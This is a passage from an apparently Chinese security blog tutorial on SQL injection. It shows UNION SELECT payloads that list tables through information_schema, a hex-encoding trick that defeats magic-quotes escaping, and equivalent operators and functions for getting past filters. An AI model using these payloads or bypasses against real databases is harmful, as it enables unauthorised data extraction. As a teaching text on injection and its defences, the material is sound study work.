+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#原来传入的注入语句
+id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>进过GPC转义后，SQL语法就会发生错误，不能正常注入</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#实际传入的注入语句
+id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;\&#39;test\&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>利用编码绕过</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#利用特性将表名十六进制编码后传入，不需要单引号
+id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="等价函数字符替换绕过"><a href="#等价函数字符替换绕过" class="headerlink" title="等价函数字符替换绕过"></a>等价函数字符替换绕过</h3><ul>
+<li>等价等号</li>
+</ul>
+<p>用<code>like</code>或<code>in</code>代替<code>=</code></p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png" alt="image-20210726154407760" loading="lazy"></p>
+<ul>
+<li>等价逗号</li>
+</ul>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png" alt="image-20210726154551164" loading="lazy"></p>
+<ul>
+<li><p>等价函数</p>
+<p>sleep函数与benchmark函数等价</p>
+<p>ascii函数与hex、bin、conv函数等价</p>
+<p>group_concat函数与concat_ws函数等价</p>
+<p>updatexml函数与extractvalue函数等价</p>
+</li>
+</ul>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">竟然有用？！赏！！！</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/Alipay.png"><img loading="lazy" src="/images/Alipay.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a href="/images/WechatPay.png"><img loading="lazy" src="/images/WechatPay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Nayst</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/" title="深入了解sql注入">http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/09/10/sql/" rel="prev" title="mysql注入练习"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">mysql注入练习</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98/" rel="next" title="文件上传题练习"><span class="post-nav-text">文件上传题练习</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Nayst</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.3</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
